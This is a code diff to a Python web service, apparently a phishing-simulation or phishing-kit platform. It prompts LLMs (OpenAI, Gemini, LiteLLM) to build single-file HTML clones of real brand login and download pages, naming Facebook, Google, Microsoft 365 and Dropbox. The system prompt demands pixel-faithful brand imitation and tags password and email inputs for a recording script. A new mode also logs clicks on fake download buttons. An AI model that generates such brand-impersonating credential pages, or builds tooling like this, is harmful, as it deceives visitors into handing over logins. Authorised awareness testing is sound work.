@@ -102,7 +102,7 @@ def get_router(db_user: DBUser):
         """
         # 這裡順便做一次初始化檢查 (雖然有點髒，但確保無痛遷移)
         # 更好的做法是在 main.py lifespan 中做
-        defaults = ["test", "google", "onedrive", "modern"]
+        defaults = ["test", "google", "onedrive", "modern", "dropbox"]
         for val in defaults:
                 exists = await db_controller.get_one(TriggerPage, {"page_value": val})
                 
@@ -719,6 +719,7 @@ def get_router(db_user: DBUser):
         prompt: str = Form(..., description="使用者的提示詞"),
         refUrl: str = Form(None, description="參考網址 (可選)"),
         image: UploadFile = File(None, description="參考圖片 (可選)"),
+        pageType: str = Form("field", description="網頁類型: 'field' 欄位觸發 | 'download' 下載按鍵觸發"),
         current_user: dict = Depends(get_current_user)
     ):
         """
@@ -746,7 +747,7 @@ def get_router(db_user: DBUser):
             raise HTTPException(status_code=500, detail=f"LiteLLM Client 設定失敗: {str(e)}")
 
         # 3. 準備 System Prompt (共用)
-        system_instructions = get_system_prompt()
+        system_instructions = get_system_prompt(pageType)
         user_prompt = f"使用者的需求：{prompt}"
         if refUrl:
             user_prompt += f"\n\n[參考網址]\n使用者提供了一個參考網址：{refUrl}\n這是使用者想模仿的目標。請盡可能參考該網址對應的現有網站設計風格。"
@@ -814,6 +815,7 @@ def get_router(db_user: DBUser):
         prompt: str = Form(..., description="使用者的提示詞"),
         refUrl: str = Form(None, description="參考網址 (可選)"),
         image: UploadFile = File(None, description="參考圖片 (可選)"),
+        pageType: str = Form("field", description="網頁類型: 'field' 欄位觸發 | 'download' 下載按鍵觸發"),
         current_user: dict = Depends(get_current_user)
     ):
         """
@@ -837,7 +839,7 @@ def get_router(db_user: DBUser):
             raise HTTPException(status_code=500, detail=f"OpenAI Client 設定失敗: {str(e)}")
 
         # 3. 準備 System Prompt (共用)
-        system_instructions = get_system_prompt()
+        system_instructions = get_system_prompt(pageType)
         user_prompt = f"使用者的需求：{prompt}"
         if refUrl:
             user_prompt += f"\n\n[參考網址]\n使用者提供了一個參考網址：{refUrl}\n這是使用者想模仿的目標。請盡可能參考該網址對應的現有網站設計風格。"
@@ -902,6 +904,7 @@ def get_router(db_user: DBUser):
         prompt: str = Form(..., description="使用者的提示詞"),
         refUrl: str = Form(None, description="參考網址 (可選)"),
         image: UploadFile = File(None, description="參考圖片 (可選)"),
+        pageType: str = Form("field", description="網頁類型: 'field' 欄位觸發 | 'download' 下載按鍵觸發"),
         current_user: dict = Depends(get_current_user)
     ):
         """
@@ -926,7 +929,7 @@ def get_router(db_user: DBUser):
             raise HTTPException(status_code=500, detail=f"Gemini 設定失敗: {str(e)}")
 
         # 3. 準備 System Prompt
-        system_instructions = get_system_prompt()
+        system_instructions = get_system_prompt(pageType)
 
         prompt_suffix = f"使用者的需求：{prompt}"
         if refUrl:
@@ -966,42 +969,85 @@ def get_router(db_user: DBUser):
 
     return router
 
-def get_system_prompt():
-    return """
-            你是一個專業的前端工程師，專門製作登入頁面。
-            使用者會給你一個描述 (e.g. "Facebook 登入頁面")，你需要生成一個單一的 HTML 檔案。
+def get_system_prompt(page_type: str = "field"):
+    """
+    依據網頁類型產生對應的 System Prompt。
+    page_type: 'field' 欄位觸發 | 'download' 下載按鍵觸發
+    """
 
-            [重點功能 - 仿真設計]
-            1. 如果使用者指定了特定的知名服務 (例如：Facebook, Google, 台鐵, Instagram, Microsoft 365 等)：
-            - 你必須運用你內部的知識，精確還原該品牌 **真實登入頁面** 的視覺風格。
-            - 使用該品牌的官方配色 (Brand Colors)。
-            - 模仿其佈局結構 (例如：左右分割、置中卡片、背景圖風格)。
-            - 盡可能還原按鈕樣式、輸入框樣式和字體風格。
-            - 如果需要 Logo，請使用 SVG 繪製或使用可靠的 CDN 連結，使其看起來像真的。
+    # 共用：仿真設計說明
+    common_intro = """
+        你是一個專業的前端工程師，擅長製作高仿真網頁。
+        使用者會給你一個描述 (e.g. "Facebook 登入頁面" 或 "Dropbox 下載頁面")，你需要生成一個單一的 HTML 檔案。
 
-            [必要的技術限制 - 絕對必須遵守]
-            1. **必須**包含以下 Script 區塊，且必須放在 `</body>` 之前：
-            ```html
-            <script>
-                const API_BASE_PATH = "{{ api_base_path }}";
-            </script>
-            <script src="{{ url_for('static', path='js/recordingLogin.js') }}"></script>
-            ```
-            **注意**：`API_BASE_PATH` 的值必須保留為 Jinja2 的模板語法 `{{ api_base_path }}`，`src` 也必須保留 `{{ url_for(...) }}`。不要更改它們。
+        [重點功能 - 仿真設計]
+        1. 如果使用者指定了特定的知名服務 (例如：Facebook, Google, 台鐵, Instagram, Microsoft 365, Dropbox 等)：
+        - 你必須運用你內部的知識，精確還原該品牌 **真實頁面** 的視覺風格。
+        - 使用該品牌的官方配色 (Brand Colors)。
+        - 模仿其佈局結構 (例如：左右分割、置中卡片、背景圖風格)。
+        - 盡可能還原按鈕樣式、輸入框樣式和字體風格。
+        - 如果需要 Logo，請使用 SVG 繪製或使用可靠的 CDN 連結，使其看起來像真的。
+    """
 
-            2. **登入表單的輸入欄位**：
-            - **必須**使用 `<form id="login-form">` 包裝所有的輸入欄位和提交按鈕。
-            - 所有的 `<input>` 標籤，如果是用來讓使用者輸入資料的 (如 Email, 帳號, 密碼)，**必須**加上屬性 `data-role="login-input"`。
-            - 例如：`<input type="email" name="email" data-role="login-input" required>`
-            - `input` 的 `id` 屬性也請設定。
+    if page_type == "download":
+        # 下載按鍵觸發模式
+        trigger_instructions = """
+        [必要的技術限制 - 下載按鍵觸發模式 - 絕對必須遵守]
+        1. **必須**包含以下 Script 區塊，且必須放在 `</body>` 之前：
+        ```html
+        <script>
+            const API_BASE_PATH = "{{ api_base_path }}";
+        </script>
+        <script src="{{ url_for('static', path='js/recordingLogin.js') }}"></script>
+        ```
+        **注意**：`API_BASE_PATH` 的值必須保留為 Jinja2 的模板語法 `{{ api_base_path }}`，`src` 也必須保留 `{{ url_for(...) }}`。不要更改它們。
 
-            3. **樣式 (CSS)**：
-            - 請將 CSS 直接寫在 `<style>` 標籤內 (Internal CSS)。
-            - 版面要符合使用者的描述。
+        2. **下載按鍵設定**：
+        - 頁面上所有會觸發記錄的**主要按鈕/連結**，必須加上屬性 `data-role="download-trigger"`。
+        - 例如：`<button type="button" data-role="download-trigger">下載</button>`
+        - 或連結：`<a href="#" data-role="download-trigger">下載檔案</a>`
+        - 這個屬性會被 `recordingLogin.js` 自動監聽，點擊後就會觸發後端記錄。
+        - **不要**寫 `<form id="login-form">`，這個模式**不需要登入表單**。
 
-            4. **輸出格式**：
-            - 只回傳純 HTML 程式碼。
-            - 不要包含 Markdown 的 ```html ... ``` 標記，只要 HTML 本身。
-            - 不要包含解釋性文字。
+        3. **樣式 (CSS)**：
+        - 請將 CSS 直接寫在 `<style>` 標籤內 (Internal CSS)。
+        - 版面要符合使用者的描述（例如：檔案分享頁、下載頁面）。
+
+        4. **輸出格式**：
+        - 只回傳純 HTML 程式碼。
+        - 不要包含 Markdown 的 ```html ... ``` 標記，只要 HTML 本身。
+        - 不要包含解釋性文字。
         """
+    else:
+        # 欄位觸發模式（預設）
+        trigger_instructions = """
+        [必要的技術限制 - 欄位填入觸發模式 - 絕對必須遵守]
+        1. **必須**包含以下 Script 區塊，且必須放在 `</body>` 之前：
+        ```html
+        <script>
+            const API_BASE_PATH = "{{ api_base_path }}";
+        </script>
+        <script src="{{ url_for('static', path='js/recordingLogin.js') }}"></script>
+        ```
+        **注意**：`API_BASE_PATH` 的值必須保留為 Jinja2 的模板語法 `{{ api_base_path }}`，`src` 也必須保留 `{{ url_for(...) }}`。不要更改它們。
+
+        2. **表單的輸入欄位**：
+        - **必須**使用 `<form id="login-form">` 包裝所有的輸入欄位和提交按鈕。
+        - 所有的 `<input>` 標籤，如果是用來讓使用者輸入資料的 (如 Email, 帳號, 密碼)，**必須**加上屬性 `data-role="login-input"`。
+        - 例如：`<input type="email" name="email" data-role="login-input" required>`
+        - `input` 的 `id` 屬性也請設定。
+
+        3. **樣式 (CSS)**：
+        - 請將 CSS 直接寫在 `<style>` 標籤內 (Internal CSS)。
+        - 版面要符合使用者的描述。
+
+        4. **輸出格式**：
+        - 只回傳純 HTML 程式碼。
+        - 不要包含 Markdown 的 ```html ... ``` 標記，只要 HTML 本身。
+        - 不要包含解釋性文字。
+        """
+
+    return common_intro + trigger_instructions
+
+
 
